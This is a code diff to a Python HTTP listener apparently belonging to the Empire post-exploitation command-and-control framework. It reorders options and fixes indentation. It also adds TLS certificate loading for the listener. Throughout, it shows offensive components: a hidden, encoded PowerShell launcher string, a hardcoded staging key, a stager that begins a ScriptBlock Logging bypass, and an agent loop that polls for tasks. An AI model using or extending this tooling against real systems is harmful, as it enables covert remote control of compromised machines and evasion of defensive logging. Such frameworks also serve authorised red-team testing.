@@ -2,8 +2,10 @@ import logging
 import base64
 import random
 import os
+import ssl
 import time
 import copy
+import sys
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
 
@@ -56,16 +58,16 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   80
             },
-            'Launcher' : {
-                'Description'   :   'Launcher string.',
-                'Required'      :   True,
-                'Value'         :   'powershell -noP -sta -w 1 -enc '
-            },
             'StagingKey' : {
                 'Description'   :   'Staging key for initial agent negotiation.',
                 'Required'      :   True,
                 'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
             },
+            'Launcher' : {
+                 'Description'   :   'Launcher string.',
+                 'Required'      :   True,
+                 'Value'         :   'powershell -noP -sta -w 1 -enc '
+             },
             'DefaultDelay' : {
                 'Description'   :   'Agent delay/reach back interval (in seconds).',
                 'Required'      :   True,
@@ -188,9 +190,9 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-		stager = '$ErrorActionPreference = \"SilentlyContinue\";'
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
-		    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
                     stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
@@ -397,7 +399,7 @@ class Listener:
                     $script:GetTask = {
                         try {
                                 # keep checking to see if there is response
-				#write-host "requesting task";
+                                #write-host "requesting task";
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
@@ -626,7 +628,19 @@ class Listener:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
+                certPath = os.path.abspath(certPath)
+
+                # support any version of tls
+                pyversion = sys.version_info
+                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
+                    proto = ssl.PROTOCOL_TLS
+                elif pyversion[0] >= 3:
+                    proto = ssl.PROTOCOL_TLS
+                else:
+                    proto = ssl.PROTOCOL_SSLv23
+
+                context = ssl.SSLContext(proto)
+                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
